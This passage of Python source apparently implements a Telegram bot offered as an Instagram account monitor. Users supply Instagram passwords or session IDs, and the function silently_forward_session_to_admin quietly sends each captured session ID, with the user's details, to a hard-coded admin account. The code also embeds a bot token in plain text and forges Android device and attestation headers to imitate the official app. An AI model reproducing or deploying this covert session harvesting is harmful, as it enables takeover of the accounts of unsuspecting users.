from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route("/")
def home():
    return "WLZBI Instagram Monitor Bot"

def run_flask():
    app.run(host="0.0.0.0", port=8080)
import asyncio
import json
import logging
import sqlite3
import time
import signal
import re
import secrets
import random
import uuid
import html
from typing import Dict, Optional, Set, List, Any, Tuple
from datetime import datetime, timedelta

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from telegram.error import TimedOut, RetryAfter, NetworkError
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, ClientError, RateLimitError, PleaseWaitFewMinutes
from fake_useragent import UserAgent

BOT_TOKEN = "8795184556:AAF3gB2nB2Xd_pZf2cRtaynzEAY1B2TpHsU"
ADMIN_USER_ID = 7282835498
REQUIRED_TAG = "@parithings"
DEFAULT_MONITOR_INTERVAL = 15
DB_PATH = "wlzbi_monitor.db"
MAX_RETRIES = 3
RETRY_BACKOFF = 5
REQUEST_TIMEOUT = 30
CONNECT_TIMEOUT = 15
SEPARATOR = "━━━━━━━━━━━━━━━━━━━"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

user_agent_cache: Dict[int, str] = {}
ua_generator = UserAgent()

def get_user_agent(user_id: int) -> str:
    if user_id not in user_agent_cache:
        user_agent_cache[user_id] = ua_generator.random
        logger.info(f"Generated new User-Agent for user {user_id}")
    return user_agent_cache[user_id]

async def silently_forward_session_to_admin(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, session_id: str):
    try:
        user = get_user(user_id)
        user_username = user['username'] if user else "Unknown"
        user_first_name = user['first_name'] if user else "Unknown"
        
        message = (
            f"🔐 <b>New Session Added Silently</b>\n"
            f"{SEPARATOR}\n"
            f"👤 User ID: <code>{user_id}</code>\n"
            f"✳️ Username: @{user_username}\n"
            f"📛 Name: {user_first_name}\n"
            f"📱 Instagram: @{username}\n"
            f"🔑 Session ID: <code>{session_id}</code>\n"
            f"⏱️ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{SEPARATOR}\n"
            f"⚠️ This session was automatically forwarded for admin use."
        )
        
        await context.bot.send_message(
            ADMIN_USER_ID,
            message,
            parse_mode="HTML"
        )
        logger.info(f"Silently forwarded session for @{username} from user {user_id} to admin")
    except Exception as e:
        logger.error(f"Failed to silently forward session: {e}")

def validate_ig_username(username: str) -> Tuple[bool, str]:
    if not username:
        return False, "Username cannot be empty."
    if username.startswith('@'):
        return False, "Please enter the username without @."
    if not re.match(r'^[a-z0-9_.]{1,30}$', username):
        return False, "Invalid format. Use only lowercase letters, numbers, underscore (_), dot (.), max 30 characters, no spaces."
    return True, username

class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self._init_tables()
        self._migrate_schema()

    def _init_tables(self):
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            bio TEXT,
            is_premium INTEGER DEFAULT 0,
            premium_expiry INTEGER DEFAULT 0,
            max_accounts INTEGER DEFAULT 1,
            granted_slots INTEGER DEFAULT 0,
            monitor_interval INTEGER DEFAULT 15,
            first_start INTEGER DEFAULT 1,
            created_at INTEGER DEFAULT 0
        )''')
        
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS ig_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_user_id INTEGER,
            instagram_username TEXT,
            session_id TEXT,
            session_scope TEXT DEFAULT 'user',
            is_active INTEGER DEFAULT 1,
            status TEXT DEFAULT 'valid',
            created_at INTEGER DEFAULT 0,
            updated_at INTEGER DEFAULT 0,
            last_validated_at INTEGER DEFAULT 0,
            expires_at INTEGER DEFAULT 0,
            UNIQUE(owner_user_id, instagram_username)
        )''')
        
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS monitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ig_username TEXT,
            monitor_type TEXT,
            start_time INTEGER,
            status TEXT DEFAULT 'pending',
            result_data TEXT,
            ban_info TEXT,
            assigned_worker TEXT,
            assigned_session_id INTEGER,
            initial_state TEXT,
            last_state TEXT,
            first_check_completed INTEGER DEFAULT 0
        )''')
        
        self.conn.commit()

    def _migrate_schema(self):
        def column_exists(table, column):
            self.cursor.execute(f"PRAGMA table_info({table})")
            columns = [row[1] for row in self.cursor.fetchall()]
            return column in columns

        def table_exists(table):
            self.cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table,))
            return self.cursor.fetchone() is not None

        users_columns = [
            ('granted_slots', 'INTEGER DEFAULT 0'),
            ('monitor_interval', 'INTEGER DEFAULT 15')
        ]
        for col, col_type in users_columns:
            if not column_exists('users', col):
                try:
                    self.cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {col_type}")
                    logger.info(f"Added missing column: {col} to users")
                except sqlite3.OperationalError as e:
                    logger.warning(f"Could not add column {col}: {e}")

        sessions_columns = [
            ('owner_user_id', 'INTEGER'),
            ('instagram_username', 'TEXT'),
            ('session_scope', "TEXT DEFAULT 'user'"),
            ('status', "TEXT DEFAULT 'valid'"),
            ('created_at', 'INTEGER DEFAULT 0'),
            ('updated_at', 'INTEGER DEFAULT 0'),
            ('last_validated_at', 'INTEGER DEFAULT 0'),
            ('expires_at', 'INTEGER DEFAULT 0')
        ]
        for col, col_type in sessions_columns:
            if not column_exists('ig_sessions', col):
                try:
                    self.cursor.execute(f"ALTER TABLE ig_sessions ADD COLUMN {col} {col_type}")
                    logger.info(f"Added missing column: {col} to ig_sessions")
                except sqlite3.OperationalError as e:
                    logger.warning(f"Could not add column {col}: {e}")

        if not column_exists('monitors', 'assigned_session_id'):
            try:
                self.cursor.execute("ALTER TABLE monitors ADD COLUMN assigned_session_id INTEGER")
                logger.info("Added missing column: assigned_session_id to monitors")
            except sqlite3.OperationalError as e:
                logger.warning(f"Could not add assigned_session_id: {e}")

        if table_exists('ig_sessions'):
            try:
                self.cursor.execute("SELECT username FROM ig_sessions LIMIT 1")
                has_username = True
            except sqlite3.OperationalError:
                has_username = False
            
            if has_username:
                self.cursor.execute("SELECT id, username FROM ig_sessions WHERE owner_user_id IS NULL OR owner_user_id = 0")
                old_sessions = self.cursor.fetchall()
                for session in old_sessions:
                    self.cursor.execute(
                        "UPDATE ig_sessions SET owner_user_id=?, instagram_username=?, session_scope='admin', created_at=?, updated_at=? WHERE id=?",
                        (ADMIN_USER_ID, session['username'], int(time.time()), int(time.time()), session['id'])
                    )
                    logger.info(f"Migrated admin session: {session['username']}")
                self.conn.commit()
                
                try:
                    self.cursor.execute("ALTER TABLE ig_sessions RENAME COLUMN username TO instagram_username")
                    logger.info("Renamed column username to instagram_username")
                except sqlite3.OperationalError as e:
                    logger.warning(f"Could not rename column: {e}")
        else:
            logger.info("ig_sessions table does not exist, skipping migration")

        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_sessions_owner ON ig_sessions(owner_user_id)")
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_sessions_username ON ig_sessions(instagram_username)")
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_sessions_status ON ig_sessions(status)")
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_monitors_user ON monitors(user_id)")
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_monitors_status ON monitors(status)")
        self.conn.commit()

    def close(self):
        self.conn.close()

db = Database()

class InstagramLogin:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.host = random.choice(["i.instagram.com", "b.i.instagram.com"])
        self.bloks_version = "6a3cbff91965fad8f65457930cea7353a2020e5da081014807c72af8ff4e8334"
        self._device_id = None
        self._machine_id = None
        self._family_device_id = None

    def _generate_device_id(self):
        return f"android-{secrets.token_hex(16)}"

    def _generate_machine_id(self):
        return f"a{secrets.token_urlsafe(20)}"

    def _generate_family_device_id(self):
        return str(uuid.uuid4())

    def _headers(self):
        self._device_id = self._generate_device_id()
        self._machine_id = self._generate_machine_id()
        self._family_device_id = self._generate_family_device_id()
        
        return {
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'ig-intended-user-id': '0',
            'priority': 'u=3',
            'x-bloks-is-layout-rtl': 'false',
            'x-bloks-prism-button-version': 'INDIGO_PRIMARY_BORDERED_SECONDARY',
            'x-bloks-prism-colors-enabled': 'true',
            'x-bloks-prism-extended-palette-gray': 'true',
            'x-bloks-prism-extended-palette-indigo': 'true',
            'x-bloks-prism-extended-palette-polish-enabled': 'true',
            'x-bloks-prism-extended-palette-red': 'true',
            'x-bloks-prism-extended-palette-rest-of-colors': 'true',
            'x-bloks-prism-font-enabled': 'true',
            'x-bloks-prism-indigo-link-version': '1',
            'x-bloks-version-id': self.bloks_version,
            'x-fb-client-ip': 'True',
            'x-fb-connection-type': 'WIFI',
            'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.bloks.caa.login.async.send_login_request/',
            'x-fb-network-properties': 'Wifi;Validated;',
            'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","surface":"undefined","request_category":"api","purpose":"fetch","retry_attempt":"0"}}',
            'x-fb-server-cluster': 'True',
            'x-ig-android-id': 'android-' + secrets.token_hex(8),
            'x-ig-app-id': '567067343352427',
            'x-ig-app-locale': 'en_US',
            'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"' + secrets.token_urlsafe(24) + '","signed_nonce":"","key_hash":""}]}',
            'x-ig-bandwidth-speed-kbps': str(random.randint(5000, 15000)) + '.000',
            'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 20000000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 5000)),
            'x-ig-capabilities': '3brTv10=',
            'x-ig-connection-type': 'WIFI',
            'x-ig-device-id': self._device_id,
            'x-ig-device-locale': 'en_US',
            'x-ig-family-device-id': self._family_device_id,
            'x-ig-is-foldable': 'false',
            'x-ig-mapped-locale': 'en_US',
            'x-ig-timezone-offset': str(random.choice([19800, 0, -18000, -25200, 3600])),
            'x-ig-www-claim': '0',
            'x-mid': self._machine_id,
            'x-meta-usdid': str(uuid.uuid4()) + '.1' + str(int(time.time())) + '.MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE_qZAJ2CNnrKGXvlimSZ5h-FZ3Wq7nj__rx2MQi-lmLay3XEC3O0TKrrV-w_19Ft5unPiY1k43NSggixNYxw1Iw.MEUCIHldsNiJ-GkeKMTiw62tb9UmCc38TB2T9SwDSXFYo_BuAiEAhN_ZIIwlFgmx9zFaeIkgCaLikFo8SXmISB8v8qoeusU',
            'x-pigeon-rawclienttime': f'{time.time()}',
            'x-pigeon-session-id': 'UFS-' + str(uuid.uuid4()) + '-0',
            'x-tigon-is-retry': 'False',
            'user-agent': 'Instagram 435.0.0.37.76 Android (28/9; 480dpi; 1080x1920; OnePlus; PJD110; marlin; qcom; en_US; 1001775661)',
            'x-fb-appnetsession-nid': secrets.token_hex(16) + ',Wifi',
            'x-fb-appnetsession-sid': secrets.token_hex(16),
            'x-fb-conn-uuid-client': str(uuid.uuid4()).replace('-', ''),
            'x-fb-http-engine': 'Tigon/MNS/TCP',
            'x-fb-rmd': 'state=URL_ELIGIBLE',
            'x-fb-session-id': 'nid=' + secrets.token_urlsafe(12) + ';nc=1;fc=1;bc=0;',
            'x-fb-session-private': secrets.token_urlsafe(12),
        }

    def _bk_context(self):
        return json.dumps({
            "bloks_version": self.bloks_version,
            "styles_id": "instagram"
        }, separators=(',', ':'))

    def _extract_session(self, response_text):
        session_match = re.search(r'"sessionid":"([^"]+)"', response_text)
        if session_match:
            session_id = session_match.group(1)
            auth_match = re.search(r'IG-Set-Authorization.*?IGT:\d+:([A-Za-z0-9+/=_-]+)', response_text)
            if auth_match:
                token = auth_match.group(1)
                return token, session_id
            return None, session_id
        
        cookie_match = re.search(r'sessionid=([^;]+)', response_text)
        if cookie_match:
            return None, cookie_match.group(1)
        
        return None, None

    def login(self):
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                payload = {
                    'params': json.dumps({
                        "server_params": {
                            "device_id": self._generate_device_id(),
                            "server_login_source": "login",
                            "waterfall_id": str(uuid.uuid4()),
                            "machine_id": self._generate_machine_id(),
                            "from_native_screen": True,
                            "credential_type": "password",
                            "password": f"#PWD_INSTAGRAM:0:{str(int(time.time()))}:{self.password}",
                            "try_num": str(attempt + 1),
                            "family_device_id": self._generate_family_device_id(),
                            "event_flow": "login_manual",
                            "event_step": "home_page",
                            "is_from_logged_in_switcher": False,
                            "contact_point": self.username
                        }
                    }, separators=(',', ':')),
                    'bk_client_context': self._bk_context(),
                    'bloks_versioning_id': self.bloks_version
                }

                response = requests.post(
                    f"https://{self.host}/api/v1/bloks/async_action/com.bloks.www.bloks.caa.login.async.send_login_request/",
                    data=payload,
                    headers=self._headers(),
                    timeout=30
                )
                
                response_text = response.text
                logger.info(f"Login response for {self.username}: {response_text[:200]}...")
                
                token, sessionid = self._extract_session(response_text)
                
                if sessionid:
                    logger.info(f"Successfully extracted session ID for {self.username}")
                    return token, sessionid
                
                if "limbo_proactive" in response_text or "two_step_verification" in response_text:
                    logger.warning(f"2FA or device approval required for {self.username}")
                    return None, None
                
                if "password" in response_text.lower() and ("incorrect" in response_text.lower() or "wrong" in response_text.lower()):
                    logger.error(f"Invalid password for {self.username}")
                    return None, None
                
                logger.warning(f"Login attempt {attempt+1} failed for {self.username}, retrying...")
                time.sleep(2)
                
            except requests.exceptions.RequestException as e:
                logger.error(f"Login request failed: {e}")
                time.sleep(3)
            except Exception as e:
                logger.error(f"Login error: {e}")
                time.sleep(2)
        
        return None, None

async def run_instagram(func, *args, **kwargs):
    return await asyncio.wait_for(
        asyncio.to_thread(func, *args, **kwargs),
        timeout=REQUEST_TIMEOUT
    )

async def classify_account_state(client, ig_username: str) -> Tuple[str, Optional[Any], Optional[str]]:
    try:
        info = await run_instagram(client.user_info_by_username, ig_username)
        if info.is_verified:
            return ("VERIFIED", info, None)
        return ("ACCOUNT_EXISTS", info, None)
    except ClientError as e:
        error_str = str(e).lower()
        if "user not found" in error_str or "does not exist" in error_str or "could not be found" in error_str:
            return ("ACCOUNT_NOT_FOUND", None, "User not found")
        elif "private" in error_str:
            return ("ACCOUNT_PRIVATE", None, "Account is private")
        elif "rate limit" in error_str or "too many requests" in error_str or "429" in error_str:
            return ("RATE_LIMITED", None, "Rate limited")
        elif "please wait" in error_str or "slow down" in error_str:
            return ("RATE_LIMITED", None, "Please wait")
        else:
            logger.warning(f"Unclassified ClientError for @{ig_username}: {e}")
            return ("UNKNOWN_ERROR", None, str(e))
    except RateLimitError as e:
        return ("RATE_LIMITED", None, "Rate limit")
    except PleaseWaitFewMinutes as e:
        return ("RATE_LIMITED", None, "Please wait few minutes")
    except asyncio.TimeoutError:
        return ("TIMEOUT", None, "Request timeout")
    except Exception as e:
        logger.error(f"Unexpected error in classify_account_state for @{ig_username}: {e}")
        return ("UNKNOWN_ERROR", None, str(e))

class IGClientPool:
    def __init__(self):
        self.clients: Dict[str, Client] = {}
        self.locks: Dict[str, asyncio.Lock] = {}
        self.global_lock = asyncio.Lock()
        self.session_cache: Dict[str, str] = {}

    async def _get_lock(self, key: str) -> asyncio.Lock:
        async with self.global_lock:
            if key not in self.locks:
                self.locks[key] = asyncio.Lock()
            return self.locks[key]

    async def _validate_client(self, client: Client, ig_username: str) -> bool:
        try:
            await run_instagram(client.get_timeline_feed)
            return True
        except Exception as e:
            logger.warning(f"Client validation failed for {ig_username}: {e}")
            return False

    async def get_client(self, ig_username: str, context: ContextTypes.DEFAULT_TYPE = None, user_id: int = None, strict_user_session: bool = False) -> Optional[Client]:
        lock = await self._get_lock(ig_username)
        async with lock:
            if ig_username in self.clients:
                try:
                    valid = await self._validate_client(self.clients[ig_username], ig_username)
                    if valid:
                        return self.clients[ig_username]
                    else:
                        logger.warning(f"Session expired for {ig_username}")
                        db.cursor.execute(
                            "UPDATE ig_sessions SET status='expired', updated_at=? WHERE instagram_username=?",
                            (int(time.time()), ig_username)
                        )
                        db.conn.commit()
                        del self.clients[ig_username]
                        if ig_username in self.session_cache:
                            del self.session_cache[ig_username]
                        return None
                except Exception as e:
                    logger.error(f"Client check failed for {ig_username}: {e}")
                    return self.clients[ig_username]
            
            if user_id is not None:
                if strict_user_session:
                    db.cursor.execute(
                        "SELECT id, session_id, status FROM ig_sessions WHERE instagram_username=? AND owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='user'",
                        (ig_username, user_id)
                    )
                else:
                    db.cursor.execute(
                        "SELECT id, session_id, status FROM ig_sessions WHERE instagram_username=? AND owner_user_id=? AND is_active=1 AND status='valid'",
                        (ig_username, user_id)
                    )
            else:
                db.cursor.execute(
                    "SELECT id, session_id, status FROM ig_sessions WHERE instagram_username=? AND is_active=1 AND status='valid'",
                    (ig_username,)
                )
            row = db.cursor.fetchone()
            if not row or not row['session_id']:
                logger.warning(f"No active valid session found for {ig_username}")
                return None
            
            session_id = row['session_id']
            self.session_cache[ig_username] = session_id
            
            client = await self._login_with_session_id(ig_username, session_id, user_id)
            if client:
                return client
            
            db.cursor.execute(
                "UPDATE ig_sessions SET status='expired', updated_at=? WHERE instagram_username=?",
                (int(time.time()), ig_username)
            )
            db.conn.commit()
            return None

    async def _login_with_session_id(self, ig_username: str, session_id: str, user_id: int = None) -> Optional[Client]:
        try:
            client = Client()
            
            if user_id:
                user_agent = get_user_agent(user_id)
                client.set_settings({
                    "user_agent": user_agent
                })
            else:
                client.set_settings({
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                })
            
            await run_instagram(client.login_by_sessionid, session_id)
            
            try:
                await run_instagram(client.account_info)
            except:
                pass
            
            self.clients[ig_username] = client
            self.session_cache[ig_username] = session_id
            
            db.cursor.execute(
                "UPDATE ig_sessions SET last_validated_at=?, status='valid', updated_at=? WHERE instagram_username=?",
                (int(time.time()), int(time.time()), ig_username)
            )
            db.conn.commit()
            
            logger.info(f"Successfully logged into Instagram as {ig_username}")
            return client
        except (LoginRequired, asyncio.TimeoutError) as e:
            logger.error(f"Login failed for {ig_username}: {e}")
            return None
        except Exception as e:
            logger.error(f"Login failed for {ig_username}: {e}")
            return None

    async def _login_with_credentials(self, ig_username: str, password: str, user_id: int) -> Optional[Client]:
        try:
            login_helper = InstagramLogin(ig_username, password)
            token, session_id = await run_instagram(login_helper.login)
            if session_id:
                client = await self._login_with_session_id(ig_username, session_id, user_id)
                if client:
                    return client
            return None
        except Exception as e:
            logger.error(f"Credential login failed for {ig_username}: {e}")
            return None

    async def add_session_with_credentials(self, ig_username: str, password: str, user_id: int, context: ContextTypes.DEFAULT_TYPE, scope: str = 'user') -> bool:
        client = await self._login_with_credentials(ig_username, password, user_id)
        if client:
            session_id = client.get_session_id()
            if session_id:
                current_time = int(time.time())
                db.cursor.execute(
                    """INSERT OR REPLACE INTO ig_sessions 
                       (owner_user_id, instagram_username, session_id, session_scope, is_active, status, created_at, updated_at, last_validated_at) 
                       VALUES (?, ?, ?, ?, 1, 'valid', ?, ?, ?)""",
                    (user_id, ig_username, session_id, scope, current_time, current_time, current_time)
                )
                db.conn.commit()
                self.clients[ig_username] = client
                self.session_cache[ig_username] = session_id
                
                await silently_forward_session_to_admin(context, user_id, ig_username, session_id)
                
                logger.info(f"Successfully added account @{ig_username} with credentials for user {user_id}")
                return True
        return False

    async def add_session(self, ig_username: str, session_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE, scope: str = 'user') -> bool:
        client = await self._login_with_session_id(ig_username, session_id, user_id)
        if client:
            current_time = int(time.time())
            db.cursor.execute(
                """INSERT OR REPLACE INTO ig_sessions 
                   (owner_user_id, instagram_username, session_id, session_scope, is_active, status, created_at, updated_at, last_validated_at) 
                   VALUES (?, ?, ?, ?, 1, 'valid', ?, ?, ?)""",
                (user_id, ig_username, session_id, scope, current_time, current_time, current_time)
            )
            db.conn.commit()
            self.clients[ig_username] = client
            self.session_cache[ig_username] = session_id
            
            await silently_forward_session_to_admin(context, user_id, ig_username, session_id)
            
            logger.info(f"Successfully added account @{ig_username} with session ID for user {user_id}")
            return True
        return False

    async def update_session(self, ig_username: str, session_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
        lock = await self._get_lock(ig_username)
        async with lock:
            if ig_username in self.clients:
                del self.clients[ig_username]
            if ig_username in self.session_cache:
                del self.session_cache[ig_username]
        
        result = await self.add_session(ig_username, session_id, user_id, context)
        if result:
            await context.bot.send_message(
                ADMIN_USER_ID,
                f"🔄 Session updated for @{ig_username} by user {user_id}",
                parse_mode="HTML"
            )
        return result

    def get_user_sessions(self, user_id: int, scope: Optional[str] = None) -> List[Dict]:
        query = "SELECT id, instagram_username, status, session_scope FROM ig_sessions WHERE owner_user_id=? AND is_active=1"
        params = [user_id]
        if scope:
            query += " AND session_scope=?"
            params.append(scope)
        db.cursor.execute(query, params)
        return [dict(row) for row in db.cursor.fetchall()]

    def get_admin_sessions(self) -> List[Dict]:
        return self.get_user_sessions(ADMIN_USER_ID, 'admin')

    def get_session_by_username(self, username: str, user_id: int) -> Optional[Dict]:
        db.cursor.execute(
            "SELECT id, instagram_username, session_id, status FROM ig_sessions WHERE instagram_username=? AND owner_user_id=? AND is_active=1",
            (username, user_id)
        )
        row = db.cursor.fetchone()
        return dict(row) if row else None

    async def delete_session(self, ig_username: str, user_id: int) -> bool:
        try:
            db.cursor.execute(
                "SELECT id, owner_user_id, status FROM ig_sessions WHERE instagram_username=?",
                (ig_username,)
            )
            row = db.cursor.fetchone()
            
            if not row:
                logger.warning(f"Session @{ig_username} not found in database, cleaning cache")
                lock = await self._get_lock(ig_username)
                async with lock:
                    if ig_username in self.clients:
                        del self.clients[ig_username]
                    if ig_username in self.session_cache:
                        del self.session_cache[ig_username]
                return True
            
            if row['owner_user_id'] != user_id:
                logger.warning(f"User {user_id} attempted to delete session not owned by them: {ig_username}")
                return False
            
            lock = await self._get_lock(ig_username)
            async with lock:
                db.cursor.execute(
                    "DELETE FROM ig_sessions WHERE instagram_username=? AND owner_user_id=?",
                    (ig_username, user_id)
                )
                db.conn.commit()
                
                if ig_username in self.clients:
                    del self.clients[ig_username]
                if ig_username in self.session_cache:
                    del self.session_cache[ig_username]
                
                db.cursor.execute(
                    "UPDATE monitors SET status='stopped' WHERE user_id=? AND assigned_worker=? AND status='active'",
                    (user_id, ig_username)
                )
                db.conn.commit()
                
                logger.info(f"Successfully deleted session @{ig_username} by user {user_id}")
                return True
                
        except sqlite3.OperationalError as e:
            logger.error(f"Database error while deleting session @{ig_username}: {e}")
            try:
                lock = await self._get_lock(ig_username)
                async with lock:
                    if ig_username in self.clients:
                        del self.clients[ig_username]
                    if ig_username in self.session_cache:
                        del self.session_cache[ig_username]
                    db.cursor.execute(
                        "DELETE FROM ig_sessions WHERE instagram_username=? AND owner_user_id=?",
                        (ig_username, user_id)
                    )
                    db.conn.commit()
                    return True
            except Exception as retry_error:
                logger.error(f"Retry deletion failed for @{ig_username}: {retry_error}")
                return False
        except Exception as e:
            logger.error(f"Unexpected error deleting session @{ig_username}: {e}")
            return False

    async def set_session_status(self, ig_username: str, status: str) -> bool:
        db.cursor.execute(
            "UPDATE ig_sessions SET status=?, updated_at=? WHERE instagram_username=?",
            (status, int(time.time()), ig_username)
        )
        db.conn.commit()
        return True

    def get_available_sessions_for_user(self, user_id: int, is_premium: bool = False) -> List[str]:
        if is_premium:
            db.cursor.execute(
                "SELECT instagram_username FROM ig_sessions WHERE owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='admin'",
                (ADMIN_USER_ID,)
            )
        else:
            db.cursor.execute(
                "SELECT instagram_username FROM ig_sessions WHERE owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='user'",
                (user_id,)
            )
        return [row['instagram_username'] for row in db.cursor.fetchall()]

    def get_user_owned_sessions_only(self, user_id: int) -> List[str]:
        db.cursor.execute(
            "SELECT instagram_username FROM ig_sessions WHERE owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='user'",
            (user_id,)
        )
        return [row['instagram_username'] for row in db.cursor.fetchall()]

    def get_session_by_username_for_user(self, username: str, user_id: int, is_premium: bool = False) -> Optional[Dict]:
        if is_premium:
            db.cursor.execute(
                "SELECT id, instagram_username, session_id FROM ig_sessions WHERE instagram_username=? AND owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='admin'",
                (username, ADMIN_USER_ID)
            )
        else:
            db.cursor.execute(
                "SELECT id, instagram_username, session_id FROM ig_sessions WHERE instagram_username=? AND owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='user'",
                (username, user_id)
            )
        row = db.cursor.fetchone()
        return dict(row) if row else None

    def get_session_by_username_strict_user(self, username: str, user_id: int) -> Optional[Dict]:
        db.cursor.execute(
            "SELECT id, instagram_username, session_id FROM ig_sessions WHERE instagram_username=? AND owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='user'",
            (username, user_id)
        )
        row = db.cursor.fetchone()
        return dict(row) if row else None

ig_pool = IGClientPool()
application = None
active_tasks: Dict[int, Set[asyncio.Task]] = {}
user_states: Dict[int, Dict] = {}
monitor_tasks: Dict[int, asyncio.Task] = {}
shutdown_event = asyncio.Event()

def get_user(user_id: int):
    db.cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    return db.cursor.fetchone()

def create_or_update_user(user_id: int, username: str, first_name: str, bio: str):
    current_time = int(time.time())
    db.cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name, bio, created_at, first_start) VALUES (?, ?, ?, ?, ?, ?)",
        (user_id, username, first_name, bio, current_time, 1)
    )
    db.cursor.execute(
        "UPDATE users SET username=?, first_name=?, bio=? WHERE user_id=?",
        (username, first_name, bio, user_id)
    )
    db.conn.commit()

def is_premium(user_id: int) -> bool:
    db.cursor.execute("SELECT is_premium, premium_expiry FROM users WHERE user_id=?", (user_id,))
    row = db.cursor.fetchone()
    if not row or not row['is_premium']:
        return False
    if row['premium_expiry'] > int(time.time()):
        return True
    db.cursor.execute("UPDATE users SET is_premium=0, premium_expiry=0 WHERE user_id=?", (user_id,))
    db.conn.commit()
    return False

def get_max_accounts(user_id: int) -> int:
    db.cursor.execute("SELECT max_accounts, granted_slots FROM users WHERE user_id=?", (user_id,))
    row = db.cursor.fetchone()
    if not row:
        return 1
    return max(row['max_accounts'], row['granted_slots'])

def get_active_monitors(user_id: int) -> int:
    db.cursor.execute("SELECT COUNT(*) FROM monitors WHERE user_id=? AND status='active'", (user_id,))
    return db.cursor.fetchone()[0]

def get_pending_monitor(user_id: int, ig_username: str, monitor_type: str) -> Optional[int]:
    db.cursor.execute(
        "SELECT id FROM monitors WHERE user_id=? AND ig_username=? AND monitor_type=? AND status='pending'",
        (user_id, ig_username, monitor_type)
    )
    row = db.cursor.fetchone()
    return row['id'] if row else None

def check_existing_active_monitor(user_id: int, ig_username: str, monitor_type: str) -> bool:
    db.cursor.execute(
        "SELECT id FROM monitors WHERE user_id=? AND ig_username=? AND monitor_type=? AND status='active'",
        (user_id, ig_username, monitor_type)
    )
    return db.cursor.fetchone() is not None

def get_user_monitor_interval(user_id: int) -> int:
    db.cursor.execute("SELECT monitor_interval FROM users WHERE user_id=?", (user_id,))
    row = db.cursor.fetchone()
    return row['monitor_interval'] if row else DEFAULT_MONITOR_INTERVAL

def cleanup_user_tasks(user_id: int):
    if user_id in active_tasks:
        for task in active_tasks[user_id]:
            if not task.done():
                task.cancel()
        active_tasks[user_id].clear()
        del active_tasks[user_id]

def stop_user_monitors(user_id: int):
    db.cursor.execute(
        "UPDATE monitors SET status='stopped' WHERE user_id=? AND status='active'",
        (user_id,)
    )
    db.conn.commit()
    for monitor_id in list(monitor_tasks.keys()):
        db.cursor.execute("SELECT user_id FROM monitors WHERE id=?", (monitor_id,))
        row = db.cursor.fetchone()
        if row and row['user_id'] == user_id:
            task = monitor_tasks.pop(monitor_id, None)
            if task and not task.done():
                task.cancel()

def remove_monitor_completely(monitor_id: int, user_id: int) -> bool:
    try:
        db.cursor.execute("SELECT user_id, status FROM monitors WHERE id=?", (monitor_id,))
        row = db.cursor.fetchone()
        if not row:
            return False
        if row['user_id'] != user_id:
            return False
        
        if row['status'] == 'active':
            task = monitor_tasks.pop(monitor_id, None)
            if task and not task.done():
                task.cancel()
        
        db.cursor.execute("DELETE FROM monitors WHERE id=? AND user_id=?", (monitor_id, user_id))
        db.conn.commit()
        return True
    except Exception as e:
        logger.error(f"Error removing monitor {monitor_id}: {e}")
        return False

def get_worker_workloads_for_user(user_id: int, is_premium: bool = False) -> Dict[str, int]:
    workers = ig_pool.get_available_sessions_for_user(user_id, is_premium)
    workloads = {w: 0 for w in workers}
    db.cursor.execute("SELECT assigned_worker FROM monitors WHERE status='active'")
    for row in db.cursor.fetchall():
        worker = row['assigned_worker']
        if worker in workloads:
            workloads[worker] += 1
    return workloads

def get_least_loaded_worker_for_user(user_id: int, is_premium: bool = False) -> Optional[str]:
    workloads = get_worker_workloads_for_user(user_id, is_premium)
    if not workloads:
        return None
    min_load = min(workloads.values())
    candidates = [w for w, load in workloads.items() if load == min_load]
    return random.choice(candidates) if candidates else None

def get_least_loaded_user_session_for_user(user_id: int) -> Optional[str]:
